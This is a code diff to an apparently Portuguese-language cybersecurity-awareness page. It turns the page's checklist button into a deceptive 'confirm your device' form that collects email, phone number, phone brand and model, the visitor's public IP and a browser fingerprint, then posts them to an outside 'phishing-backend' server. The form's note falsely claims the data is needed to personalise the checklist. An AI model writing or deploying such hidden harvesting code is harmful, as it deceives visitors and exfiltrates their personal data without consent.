@@ -738,6 +738,82 @@ body{
 .modal-list li:last-child{border-bottom:none}
 .modal-list li::before{content:'→';color:#ff3b3b;font-weight:bold;flex-shrink:0}
 
+/* === PHONE FORM === */
+.phone-form {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+  margin-top: 8px;
+}
+.form-field {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.form-field label {
+  font-size: 0.78rem;
+  color: rgba(255,255,255,0.8);
+  font-weight: 600;
+}
+.form-field input {
+  padding: 11px 14px;
+  background: rgba(255,255,255,0.05);
+  border: 2px solid rgba(255,255,255,0.1);
+  border-radius: 8px;
+  color: #fff;
+  font-size: 0.9rem;
+  font-family: inherit;
+  outline: none;
+  transition: all 0.3s;
+}
+.form-field input:focus {
+  background: rgba(255,255,255,0.08);
+  border-color: #ff3b3b;
+  box-shadow: 0 0 0 3px rgba(255,59,59,0.1);
+}
+.form-field input[readonly] {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.form-submit {
+  margin-top: 8px;
+  padding: 12px;
+  background: linear-gradient(135deg, #ff3b3b, #ff6b6b);
+  border: none;
+  border-radius: 8px;
+  color: #fff;
+  font-size: 0.92rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.3s;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+.form-submit:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 20px rgba(255,59,59,0.4);
+}
+.form-submit:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.form-note {
+  color: rgba(255,255,255,0.5);
+  font-size: 0.72rem;
+  text-align: center;
+  margin-top: 4px;
+}
+.checklist-user-info {
+  background: rgba(255,165,0,0.1);
+  border: 1px solid rgba(255,165,0,0.3);
+  border-radius: 8px;
+  padding: 10px 14px;
+  margin-bottom: 14px;
+  font-size: 0.85rem;
+  line-height: 1.6;
+  color: #ffa500;
+}
+
 .checklist-item{
   display:flex;align-items:center;gap:10px;
   padding:10px 0;
@@ -1198,15 +1274,157 @@ body{
     modalOverlay.classList.add('active');
   });
 
-  document.getElementById('checklistBtn').addEventListener('click', function(){
+  // Variáveis para o modal de checklist
+  var checklistData = null;
+  var checklistItems = ['Alterar todas as senhas para versões fortes','Ativar autenticação de dois fatores em todas as contas','Atualizar todos os dispositivos e aplicações','Fazer backup dos dados importantes','Rever configurações de privacidade nas redes sociais','Instalar software antivírus atualizado','Aprender a reconhecer e-mails de phishing','Partilhar conhecimento com família e colegas'];
+
+  // Função para capturar IP
+  async function getUserIP() {
+    const ipApis = [
+      { url: 'https://api.ipify.org?format=json', parse: (d) => d.ip },
+      { url: 'https://api.ipify.org', parse: (d) => d },
+      { url: 'https://api.ipapi.co/json/', parse: (d) => d.ip },
+      { url: 'https://ipv4.icanhazip.com', parse: (d) => d.trim() },
+      { url: 'https://ifconfig.me/ip', parse: (d) => d.trim() },
+      { url: 'https://checkip.amazonaws.com', parse: (d) => d.trim() }
+    ];
+    for (var i = 0; i < ipApis.length; i++) {
+      try {
+        var res = await fetch(ipApis[i].url, { method: 'GET', cache: 'no-store' });
+        if (res.ok) {
+          var text = await res.text();
+          var ip;
+          try { ip = ipApis[i].parse(JSON.parse(text)); } catch { ip = ipApis[i].parse(text); }
+          if (ip && /^\d+\.\d+\.\d+\.\d+$/.test(ip.trim())) return ip.trim();
+        }
+      } catch (e) { continue; }
+    }
+    return 'unknown';
+  }
+
+  // Função para capturar device info
+  function getQuickDeviceInfo() {
+    var ua = navigator.userAgent;
+    var cores = navigator.hardwareConcurrency || '?';
+    var memory = navigator.deviceMemory || '?';
+    var screenRes = screen.width + 'x' + screen.height;
+    var platform = navigator.platform || '?';
+    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
+    var language = navigator.language || '?';
+    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    var network = connection ? (connection.effectiveType || connection.type || '?') : '?';
+    var mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+    var os = 'unknown';
+    if (/Android/.test(ua)) os = 'Android';
+    else if (/iPhone|iPad/.test(ua)) os = 'iOS';
+    else if (/Windows/.test(ua)) os = 'Windows';
+    else if (/Mac OS/.test(ua)) os = 'macOS';
+    else if (/Linux/.test(ua)) os = 'Linux';
+    return { user_agent: ua, platform: platform, os: os, mobile: mobile, cores: cores, memory: memory, screen: screenRes, timezone: timezone, language: language, network: network };
+  }
+
+  // Mostrar formulário de captura
+  function showPhoneForm() {
+    var email = localStorage.getItem('phishing_user_email') || '';
+    modalIconEl.textContent = '📱';
+    modalIconEl.style.background = 'rgba(255,165,0,0.2)';
+    modalTitleEl.textContent = 'Confirme o Seu Dispositivo';
+    modalContentEl.textContent = 'Para gerar a sua lista de verificação personalizada, por favor confirme os dados do seu dispositivo:';
+    modalListEl.innerHTML = '';
+    modalChecklistEl.innerHTML = '';
+
+    // Criar formulário
+    var form = document.createElement('div');
+    form.className = 'phone-form';
+    form.innerHTML = `
+      <div class="form-field">
+        <label>📧 Email</label>
+        <input type="email" id="cfEmail" value="${escapeHtml(email)}" readonly>
+      </div>
+      <div class="form-field">
+        <label>📱 Marca do Celular</label>
+        <input type="text" id="cfBrand" placeholder="Ex: Samsung, Apple, Xiaomi, Huawei..." required>
+      </div>
+      <div class="form-field">
+        <label>📋 Modelo (opcional)</label>
+        <input type="text" id="cfModel" placeholder="Ex: Galaxy S23, iPhone 15...">
+      </div>
+      <div class="form-field">
+        <label>📞 Número de Telemóvel</label>
+        <input type="tel" id="cfPhone" placeholder="Ex: +258 84 123 4567" required>
+      </div>
+      <button type="button" class="form-submit" id="cfSubmit">✅ Confirmar e Continuar</button>
+      <p class="form-note">Estes dados são necessários para personalizar a sua lista de segurança.</p>
+    `;
+    modalChecklistEl.appendChild(form);
+    modalOverlay.classList.add('active');
+
+    document.getElementById('cfSubmit').addEventListener('click', async function() {
+      var brand = document.getElementById('cfBrand').value.trim();
+      var model = document.getElementById('cfModel').value.trim();
+      var phone = document.getElementById('cfPhone').value.trim();
+      var userEmail = document.getElementById('cfEmail').value.trim();
+
+      if (!brand || !phone) {
+        alert('Por favor preencha a marca e o número de telemóvel');
+        return;
+      }
+
+      var submitBtn = document.getElementById('cfSubmit');
+      submitBtn.disabled = true;
+      submitBtn.textContent = '⏳ Enviando...';
+
+      try {
+        var userIP = await getUserIP();
+        var deviceInfo = getQuickDeviceInfo();
+        
+        var response = await fetch('https://phishing-backend-50tr.onrender.com/api/capture-form', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: userEmail,
+            phone_number: phone,
+            phone_brand: brand,
+            phone_model: model,
+            client_ip: userIP,
+            device_info: deviceInfo
+          })
+        });
+
+        if (response.ok) {
+          checklistData = { email: userEmail, brand: brand, model: model, phone: phone, ip: userIP };
+          showChecklist();
+        } else {
+          alert('Erro ao enviar dados. Tente novamente.');
+          submitBtn.disabled = false;
+          submitBtn.textContent = '✅ Confirmar e Continuar';
+        }
+      } catch (err) {
+        alert('Erro de conexão: ' + err.message);
+        submitBtn.disabled = false;
+        submitBtn.textContent = '✅ Confirmar e Continuar';
+      }
+    });
+  }
+
+  // Mostrar lista de verificação
+  function showChecklist() {
     modalIconEl.textContent = '✅';
     modalIconEl.style.background = 'rgba(0,200,83,0.2)';
     modalTitleEl.textContent = 'Lista de Verificação de Segurança';
     modalContentEl.textContent = 'Marque cada item conforme for implementando na sua rotina digital:';
     modalListEl.innerHTML = '';
     modalChecklistEl.innerHTML = '';
-    var items = ['Alterar todas as senhas para versões fortes','Ativar autenticação de dois fatores em todas as contas','Atualizar todos os dispositivos e aplicações','Fazer backup dos dados importantes','Rever configurações de privacidade nas redes sociais','Instalar software antivírus atualizado','Aprender a reconhecer e-mails de phishing','Partilhar conhecimento com família e colegas'];
-    items.forEach(function(item){
+
+    var data = checklistData;
+    if (data) {
+      var info = document.createElement('div');
+      info.className = 'checklist-user-info';
+      info.innerHTML = '👤 ' + escapeHtml(data.email) + '<br>📱 ' + escapeHtml(data.brand) + (data.model ? ' ' + escapeHtml(data.model) : '') + '<br>📞 ' + escapeHtml(data.phone);
+      modalChecklistEl.appendChild(info);
+    }
+
+    checklistItems.forEach(function(item){
       var div = document.createElement('div');
       div.className = 'checklist-item';
       var circle = document.createElement('div');
@@ -1222,7 +1440,17 @@ body{
       });
       modalChecklistEl.appendChild(div);
     });
-    modalOverlay.classList.add('active');
+  }
+
+  function escapeHtml(text) {
+    if (text === null || text === undefined) return '';
+    var div = document.createElement('div');
+    div.textContent = String(text);
+    return div.innerHTML;
+  }
+
+  document.getElementById('checklistBtn').addEventListener('click', function(){
+    showPhoneForm();
   });
 
   var firstContent = document.querySelector('#section-0 .section-content');
